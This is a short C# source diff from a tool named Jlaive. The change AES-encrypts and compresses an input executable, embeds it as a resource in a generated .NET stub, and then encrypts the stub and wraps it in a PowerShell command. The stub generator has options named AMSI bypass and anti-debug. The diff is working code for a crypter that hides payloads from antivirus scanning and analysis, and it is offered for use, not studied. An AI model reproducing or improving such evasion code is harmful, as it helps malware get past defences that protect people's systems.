@@ -57,10 +57,12 @@ namespace Jlaive
             byte[] pbytes = File.ReadAllBytes(_input);
 
             Console.WriteLine("Creating .NET stub...");
-            string stub = StubGen.CreateCS(pbytes, _amsibypass, _antidebug, rng);
-
+            AesManaged aes = new AesManaged();
+            string stub = StubGen.CreateCS(aes.Key, aes.IV, _amsibypass, _antidebug, rng);
             string tempfile = Path.GetTempFileName();
             Console.WriteLine("Compiling stub...");
+            File.WriteAllText("payload.txt", Convert.ToBase64String(Encrypt(Compress(pbytes), aes.Key, aes.IV)));
+            aes.Dispose();
             CSharpCodeProvider csc = new CSharpCodeProvider();
             CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, tempfile)
             {
@@ -68,6 +70,7 @@ namespace Jlaive
                 CompilerOptions = "/optimize",
                 IncludeDebugInformation = false
             };
+            parameters.EmbeddedResources.Add("payload.txt");
             CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);
             if (results.Errors.Count > 0)
             {
@@ -80,10 +83,11 @@ namespace Jlaive
                 return;
             }
             byte[] stubbytes = File.ReadAllBytes(tempfile);
+            File.Delete("payload.txt");
             File.Delete(tempfile);
 
             Console.WriteLine("Encrypting stub...");
-            AesManaged aes = new AesManaged();
+            aes = new AesManaged();
             byte[] encrypted = Encrypt(Compress(stubbytes), aes.Key, aes.IV);
 
             Console.WriteLine("Creating PowerShell command...");
